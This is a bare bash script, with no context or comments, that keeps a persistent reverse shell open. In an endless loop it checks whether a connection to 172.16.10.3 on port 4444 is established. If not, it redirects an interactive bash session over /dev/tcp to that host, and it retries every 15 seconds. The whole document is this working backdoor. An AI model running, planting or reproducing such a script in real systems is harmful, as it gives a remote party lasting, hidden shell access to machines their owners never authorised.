#!/bin/bash
SERVER_IP=172.16.10.3
SERVER_PORT=4444

while true; do
    if ! netstat -an | grep -q "$SERVER_IP:$SERVER_PORT .* ESTABLISHED"; then
        bash -c "bash >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1"
    fi
    sleep 15
done;